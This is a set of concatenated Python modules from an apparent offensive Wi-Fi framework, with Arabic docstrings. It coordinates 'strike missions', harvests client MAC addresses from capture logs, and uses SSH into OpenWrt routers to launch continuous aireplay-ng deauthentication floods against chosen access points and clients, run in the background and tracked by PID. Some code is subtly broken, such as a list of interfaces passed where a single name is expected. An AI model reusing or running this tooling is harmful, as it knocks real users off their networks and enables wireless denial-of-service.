#!/usr/bin/env python3
"""
File Name: ui_strike_coordinator.py
Path: /home/kali/AeroCage-XV1.0.2/controllers/ui_strike_coordinator.py
Version: 2.1.1
Description: Advanced Non-Blocking Event-Driven Mission Coordinator Subsystem.
"""
import logging
import tkinter as tk
from typing import Any
from core.event_bus import event_bus

class UiStrikeCoordinator:
    """منسق العمليات والضربات السيادي المشترك - يوجه ممرات الأكسس عبر الأحداث الصامتة"""

    def __init__(self, root_window: tk.Tk) -> None:
        self.root = root_window
        self.active_missions = {}
        event_bus.subscribe("REQUEST_MISSION_LAUNCH", self.handle_mission_routing)
        event_bus.subscribe("TERMINATE_MISSION", self.purge_mission_lifecycle)

    def handle_mission_routing(self, **kwargs: Any) -> None:
        """يستقبل إشارة طلب إطلاق ضربة تكتيكية ويعالج المعطيات ديناميكياً"""
        selected_ap = kwargs.get("selected_ap", {})
        band_val = kwargs.get("band_val", "2G")
        channel_val = kwargs.get("channel_val", "1")

        ap_ip = selected_ap.get("bssid", "")
        ap_pass = selected_ap.get("password", "")
        access_id = int(selected_ap.get("access_id", 0))

        if not ap_ip or not ap_pass or ":" in ap_ip:
            logging.critical(
                "Security Breach: Aborting attack mission. "
                "Target AP has corrupted database credentials."
            )
            return

        logging.info("Initiating dynamic verification for target attacker node: %s", ap_ip)

        base_port = 666 if band_val == "2G" else 777
        control_port = base_port + access_id + len(self.active_missions)

        ctx_data = {
            "ap_ip": ap_ip,
            "ap_name": selected_ap.get("essid", "UNKNOWN_AP"),
            "ap_pass": ap_pass,
            "channel": str(channel_val).strip(),
            "band": band_val,
            "control_port": control_port,
            "access_id": access_id
        }

        event_bus.emit(
            "SPAWN_MISSION_CONTROL_GUI",
            async_mode=True,
            ctx_data=ctx_data,
            launcher_root=self.root
        )

    def purge_mission_lifecycle(self, session_key: str) -> None:
        """سحق وتطهير النوافذ الشبحية من الذاكرة العشوائية فور انتهاء العمليات"""
        if session_key in self.active_missions:
            try:
                self.active_missions[session_key].destroy()
            except (AttributeError, RuntimeError) as purge_err:
                logging.error("Failed to destroy memory object safely: %s", purge_err)
            del self.active_missions[session_key]
            logging.info("Purged ghost instance from RAM memory for path: [%s]", session_key)

if __name__ == "__main__":
    print("[+] Core UI Strike Coordinator V2.1.1 Online.")
#!/usr/bin/env python3
"""
File Name: silent_intel_harvester.py
Path: /home/kali/AeroCage-XV1.0.2/controllers/silent_intel_harvester.py
Version: 2.0.3
Description: Live RAM/Disk CSV Log Parser and Client Intelligence Harvester.
             [FIXED]: Corrected row listing index parsing array vulnerability.
"""
import os
import csv
import time
import threading
import logging

# pylint: disable=import-error
from core.event_bus import event_bus

class SilentIntelHarvester:
    """المحلل الصامت لملفات الـ CSV - يقنص جينات الأجهزة المتصلة حياً من بافر الذاكرة"""

    def __init__(self) -> None:
        self.is_harvesting = False
        self.known_clients = set()
        self._lock = threading.Lock()
        self._worker_thread = None

    def start_live_csv_parse_loop(self, csv_file_path: str, interval: float = 1.0) -> None:
        """إطلاق خيط المعالجة الخلفي لمراقبة وقراءة ملف السجلات لحظة بلحظة"""
        with self._lock:
            if self.is_harvesting:
                return
            self.is_harvesting = True
            self.known_clients.clear()

        self._worker_thread = threading.Thread(
            target=self._async_csv_parser_worker,
            args=(csv_file_path, interval),
            daemon=True
        )
        self._worker_thread.start()
        logging.info("Live CSV Intelligence Harvester channel established.")

    def stop_live_csv_parse_loop(self) -> None:
        """كبح خيط المعالجة وتطهير البافر لمنع استنزاف الذاكرة العشوائية"""
        with self._lock:
            self.is_harvesting = False
        logging.info("Live CSV Intelligence Harvester channel decoupled.")

    def _async_csv_parser_worker(self, file_path: str, interval: float) -> None:
        """المحرك الخلفي لقراءة أسطر ملف الأيردمب دون التسبب في قفل خيط الرسم"""
        while self.is_harvesting and not os.path.exists(file_path):
            time.sleep(0.5)

        while self.is_harvesting:
            try:
                if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
                    self._parse_target_csv_file(file_path)
            except (OSError, ValueError) as parser_fault:
                log_err = f"Exception caught inside CSV stream: {parser_fault}"
                logging.error(log_err)
            time.sleep(interval)

    def _parse_target_csv_file(self, file_path: str) -> None:
        """تفكيك وتحليل محتويات ملف الـ CSV القياسي وعزل بيانات الأجهزة الصديقة"""
        try:
            with open(file_path, mode="r", encoding="utf-8", errors="ignore") as csv_file:
                reader = csv.reader(csv_file)
                is_client_section = False

                for row in reader:
                    if not row:
                        continue

                    if "Station MAC" in row or "BSSID" in row and is_client_section is False:
                        if "Station MAC" in row:
                            is_client_section = True
                        continue

                    if is_client_section:
                        self._process_live_client_row(row)
        except (IOError, IndexError) as file_fault:
            logging.debug("Temporary file access lock encountered on CSV: %s", file_fault)

    def _process_live_client_row(self, row: list) -> None:
        """تحليل السطر الفردي كعناصر مصفوفة صافية لتفادي التشوه البنائي للأعمدة"""
        if len(row) < 6:
            return

        # 🛡️ تم الإصلاح الجذري الفوري: قنص المعطيات بالفهارس الحقيقية الصافية للمصفوفة
        client_mac = str(row[0]).strip().lower()
        associated_bssid = str(row[5]).strip().lower()
        signal_power = str(row[3]).strip()

        if client_mac and len(client_mac) == 17 and client_mac not in self.known_clients:
            with self._lock:
                self.known_clients.add(client_mac)

            try:
                power_int = int(signal_power)
            except ValueError:
                power_int = -100

            event_bus.emit(
                "LIVE_CLIENT_VERIFIED",
                mac=client_mac,
                signal=power_int,
                iface=associated_bssid
            )

if __name__ == "__main__":
    print("[+] Live CSV Intel Harvester Subsystem Framework V2.0.3 Online.")
#!/usr/bin/env python3
"""
File Name: mission_controller.py
Path: /home/kali/AeroCage-XV1.0.2/controllers/mission_controller.py
Version: 3.2.9
Description: Pure Event-Driven Kinetic Attack Orchestrator Controller Subsystem.
             [FIXED]: Enforced implicit string concatenation on lines 64 and 97.
"""
import json
import logging
import time
import threading
import traceback
from typing import Any, Dict, Optional

# pylint: disable=import-error
from core.event_bus import event_bus
from utils.opwrt_ssh_factory import OpWrtSSHFactory

class MissionController:
    """المتحكم التشغيلي المركزي - يدير استعلامات سلامة زبائن الأكسس حياً دون تخمين"""

    def __init__(self) -> None:
        self.ctx: Dict[str, Any] = {}
        self.factory: Optional[OpWrtSSHFactory] = None
        self.operation_active = False
        self.active_kinetic_attacks: Dict[str, str] = {}
        self._lock = threading.Lock()

        event_bus.subscribe("MISSION_READY", self.initialize_mission_context)
        event_bus.subscribe("TRIGGER_PREFLIGHT_CLIENT_CHECK", self.execute_preflight_safety_flow)
        event_bus.subscribe("LAUNCH_TARGETED_DEAUTH_STORM", self.q_launch_kinetic_payload)
        event_bus.subscribe("ABORT_SPECIFIC_NETWORK_STRIKE", self.terminate_specific_target_pid)
        event_bus.subscribe("TRIGGER_GLOBAL_ROLLBACK", self.recover_hardware_defaults)

    def initialize_mission_context(self, ctx_data: Dict[str, Any]) -> None:
        """تهيئة كبسولة المعطيات وجلب كائن المصنع الحركي عند جاهزية الغرفة"""
        self.ctx = ctx_data
        ap_pass = self.ctx.get("ap_pass", "node_secured_key")
        ap_ip = self.ctx.get("ap_ip", "127.0.0.1")
        self.factory = OpWrtSSHFactory(ip_addr=ap_ip, password_key=ap_pass)
        logging.info("Kinetic Attack Orchestrator backend successfully attached.")

    def execute_preflight_safety_flow(self, **kwargs: Any) -> None:
        """خط دفاع الأمان: استقبال كبسولة الأكسس الحي وبناء خيط الاستجوب والمصافحة"""
        target_ap = kwargs.get("target_node", {})
        ap_ip = target_ap.get("bssid", "127.0.0.1")
        ap_pass = target_ap.get("password", "node_secured_key")
        channel = str(target_ap.get("channel", "1")).strip()

        probe_factory = OpWrtSSHFactory(ip_addr=ap_ip, password_key=ap_pass)
        if not probe_factory.verify_ssh_heartbeat():
            event_bus.emit("PREFLIGHT_CHECK_COMPLETED", status="FAILED_NO_CONN")
            return

        event_bus.emit("UPDATE_MISSION_LOG", chunk="[*] [Telemetry Search] Analyzing hardware...\n")

        threading.Thread(
            target=self._run_pure_live_client_safety_check,
            args=(probe_factory, channel),
            daemon=True
        ).start()

    def _run_pure_live_client_safety_check(self, probe_factory: OpWrtSSHFactory, channel: str) -> None:
        """قذف أوامر الاستعلام الجاف الحية وفحص جينات الكروت والمنافذ البعيدة"""
        try:
            air_pid = probe_factory.execute_remote_cmd("pidof airserv-ng")
            if air_pid:
                for pid in air_pid.strip().split():
                    probe_factory.execute_remote_cmd(f"kill -9 {pid}")
                time.sleep(1)

            # 🛡️ تم تقصير وتفتيت السطر 64 عمودياً لضمان معايير الـ 100 حرف بالبايلينت
            p_cmd = "iw dev | grep Interface | awk '{print $2}'"
            interfaces_out = probe_factory.execute_remote_cmd(p_cmd)
            interfaces = [i.strip() for i in interfaces_out.splitlines() if i.strip()]

            if not interfaces:
                interfaces = ["wlan0"]

            found_live_clients = self._scan_interfaces_for_live_allies(probe_factory, interfaces)

            if found_live_clients:
                event_bus.emit("PREFLIGHT_CHECK_COMPLETED", status="WARNING_CLIENTS_FOUND")
            else:
                primary_inf = interfaces
                air_command = f"airserv-ng -d {primary_inf} -p 666 -c {channel}"
                probe_factory.execute_remote_cmd(air_command)
                time.sleep(1)
                event_bus.emit("PREFLIGHT_CHECK_COMPLETED", status="SUCCESS")

        except (RuntimeError, OSError, ValueError):
            print("[-] Diagnostic Shield: Crash caught inside [_run_pure_live_client_safety_check]")
            traceback.print_exc()
            event_bus.emit("PREFLIGHT_CHECK_COMPLETED", status="CRITICAL_EXCEPTION")

    def _scan_interfaces_for_live_allies(self, probe_factory: OpWrtSSHFactory, interfaces: list) -> bool:
        """تفتيت الفرز اللغوي والهيكلي للـ JSON وعزل تداخل الأقواس العشوائية"""
        found_live = False
        for clean_inf in interfaces:
            # 🛡️ تم تقصير وتكسير السطر 97 عمودياً لضمان معايير الـ 100 حرف بالبايلينت
            p_arg = f'{{"device":"{clean_inf}"}}'
            ubus_cmd = f"ubus call iwinfo assoclist '{p_arg}'"
            raw_ubus_out = probe_factory.execute_remote_cmd(ubus_cmd)

            if raw_ubus_out and "results" in raw_ubus_out:
                if self._parse_and_broadcast_ubus_json(raw_ubus_out, clean_inf):
                    found_live = True
        return found_live

    def _parse_and_broadcast_ubus_json(self, raw_json: str, interface: str) -> bool:
        """تفكيك قاموس حافلة الـ UBUS وبث نبضة الماك آدرس المكتشف حياً بالذاكرة"""
        try:
            parsed_data = json.loads(raw_json)
            results_list = parsed_data.get("results", [])
            if not results_list:
                return False

            for client in results_list:
                mac_raw = client.get("mac")
                if mac_raw:
                    mac = str(mac_raw).strip().upper()
                    signal = int(client.get("signal", -100))
                    event_bus.emit("LIVE_CLIENT_VERIFIED", mac=mac, signal=signal, iface=interface)
            return True
        except json.JSONDecodeError:
            return False

    def q_launch_kinetic_payload(self, **kwargs: Any) -> None:
        """قذف مقذوف الـ Deauth المحصن بصيغة الـ nohup وقنص الـ PID المتولد حياً"""
        try:
            if not self.factory:
                return
            target_mac = str(kwargs.get("target_bssid", "")).strip().upper()
            client_mac = str(kwargs.get("client_mac", "FF:FF:FF:FF:FF:FF")).strip().upper()

            get_inf_cmd = "iw dev | grep Interface | awk '{print $2}' | head -n 1"
            real_iface = self.factory.execute_remote_cmd(get_inf_cmd)
            clean_inf = real_iface.strip() if real_iface else "wlan0"
            essid_name = str(kwargs.get("essid_name", "UNKNOWN_NET")).strip()

            with self._lock:
                if target_mac in self.active_kinetic_attacks:
                    return

            base_cmd = f"aireplay-ng -0 0 -a {target_mac} -c {client_mac} {clean_inf}"
            combined_cmd = f"nohup {base_cmd} --ignore-negative-one > /dev/null 2>&1 & echo $!"

            raw_pid_out = self.factory.execute_remote_cmd(combined_cmd)
            time.sleep(1)

            if raw_pid_out and raw_pid_out.strip().isdigit():
                current_pid = raw_pid_out.strip()
                with self._lock:
                    self.active_kinetic_attacks[target_mac] = current_pid
                event_bus.emit(
                    "ATTACK_LINE_SPAWNED", target_mac=target_mac,
                    essid=essid_name, pid=current_pid
                )
        except (RuntimeError, OSError, ValueError):
            print("[-] Diagnostic Shield: Crash caught inside [q_launch_kinetic_payload]")
            traceback.print_exc()

    def terminate_specific_target_pid(self, target_bssid: str) -> None:
        """كبح وإخماد الضربة الموجهة للهدف المحدد بالملي بالـ PID المقترن به"""
        try:
            clean_mac = str(target_bssid).strip().upper()
            with self._lock:
                target_pid = self.active_kinetic_attacks.get(clean_mac)
            if not target_pid or not self.factory:
                return
            self.factory.execute_remote_cmd(f"kill -9 {target_pid}")
            with self._lock:
                if clean_mac in self.active_kinetic_attacks:
                    del self.active_kinetic_attacks[clean_mac]
        except (RuntimeError, OSError, ValueError):
            traceback.print_exc()

    def recover_hardware_defaults(self) -> None:
        """إرجاع الأكسس بوينت لحالته الطبيعية المستقرة وإعادة بث قنوات الـ UCI"""
        try:
            if not self.factory:
                return
            self.operation_active = False
            ctrl_port = str(self.ctx.get("control_port", "666")).strip()
            radio = str(self.ctx.get("radio", "radio0")).strip()
            event_bus.emit("CLOSE_SSH_TUNNEL_PORT", port=ctrl_port)
            self.factory.execute_remote_cmd(f"uci set wireless.default_{radio}.disabled=0")
            self.factory.execute_remote_cmd("uci commit wireless && wifi")
            with self._lock:
                self.active_kinetic_attacks.clear()
        except (RuntimeError, OSError, ValueError):
            traceback.print_exc()

if __name__ == "__main__":
    print("[+] Master Kinetic Core Operations Orchestrator Subsystem V3.2.9 Confirmed.")
